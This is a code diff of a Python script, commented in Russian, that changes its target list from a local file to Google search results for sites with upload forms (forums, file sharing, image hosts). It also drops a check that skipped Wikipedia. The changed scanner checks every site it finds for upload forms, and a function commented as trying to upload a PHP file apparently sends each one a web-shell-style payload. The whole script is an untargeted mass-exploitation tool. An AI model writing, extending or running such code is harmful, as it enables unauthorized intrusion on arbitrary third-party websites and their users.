@@ -1,7 +1,7 @@
 import aiohttp
 import asyncio
+import requests
 from bs4 import BeautifulSoup
-import os
 from random import choice
 from urllib.parse import urljoin
 
@@ -22,18 +22,45 @@ GREEN = "\033[92m"
 RED = "\033[91m"
 RESET = "\033[0m"
 
-# Функция для проверки, является ли сайт Википедией
-def is_wikipedia(url):
-    return "wikipedia" in url.lower()
+# Тематики для поиска (сайты с формами загрузки файлов)
+themes = [
+    "news upload",                # Новостные сайты
+    "forum upload",               # Форумы
+    "article upload",             # Статьи
+    "file sharing upload",        # Файлообменники
+    "technology upload",          # Технологические сайты
+    "education upload",           # Образовательные ресурсы
+    "image upload",               # Сайты для загрузки изображений
+    "community upload",           # Сайты сообщество
+    "discussion upload"           # Обсуждения и форумы
+]
+
+# Функция для отправки поискового запроса в Google
+def google_search(query, num_results=10):
+    url = f"https://www.google.com/search?q={query}&num={num_results}"
+    
+    headers = {'User-Agent': choice(USER_AGENTS)}
+    response = requests.get(url, headers=headers)
+    
+    if response.status_code != 200:
+        print(f"Ошибка при запросе в Google: {response.status_code}")
+        return []
+
+    soup = BeautifulSoup(response.text, 'html.parser')
+    links = []
+
+    # Ищем все результаты поиска (ссылки на сайты)
+    for a in soup.find_all('a', href=True):
+        href = a['href']
+        # Фильтруем ссылки, чтобы оставались только сайты
+        if href.startswith('http'):
+            links.append(href)
+
+    return links
 
 # Функция для асинхронного сканирования сайта
 async def scan_for_file_upload(session, url):
     try:
-        # Если это Википедия, пропускаем сайт
-        if is_wikipedia(url):
-            print(f"{url} - Пропущен (Википедия)")
-            return
-
         headers = {'User-Agent': choice(USER_AGENTS)}
 
         # Выполняем GET-запрос с заголовками
@@ -63,7 +90,6 @@ async def scan_for_file_upload(session, url):
 
     except Exception as e:
         print(f"Ошибка при обработке сайта {url}: {str(e)}")
-        # Ошибка будет обработана, и сайт продолжит сканироваться
 
 # Попытка загрузить PHP файл
 async def try_upload_file(session, action_url, payload_file):
@@ -85,25 +111,23 @@ async def try_upload_file(session, action_url, payload_file):
     except Exception as e:
         return f"Ошибка при загрузке на {action_url}: {str(e)}"
 
-# Основная функция для сканирования всех сайтов
-async def scan_sites_from_file(file_path):
-    if not os.path.exists(file_path):
-        print(f"Файл {file_path} не найден.")
-        return
-
-    # Чтение URL из файла
-    with open(file_path, 'r') as file:
-        urls = [line.strip() for line in file.readlines()]
+# Основная функция для сканирования сайтов по поисковым запросам
+async def scan_sites_from_themes():
+    all_urls = []
+    
+    for theme in themes:
+        print(f"Поиск сайтов по запросу: {theme}")
+        links = google_search(theme)
+        all_urls.extend(links)
 
     # Асинхронная сессия
     async with aiohttp.ClientSession() as session:
         tasks = []
-        for url in urls:
+        for url in all_urls:
             tasks.append(scan_for_file_upload(session, url))
 
         # Параллельное выполнение всех задач
         await asyncio.gather(*tasks)
 
 # Запуск асинхронного сканирования
-file_path = "sites.txt"  # Путь к файлу с сайтами
-asyncio.run(scan_sites_from_file(file_path))
+asyncio.run(scan_sites_from_themes())
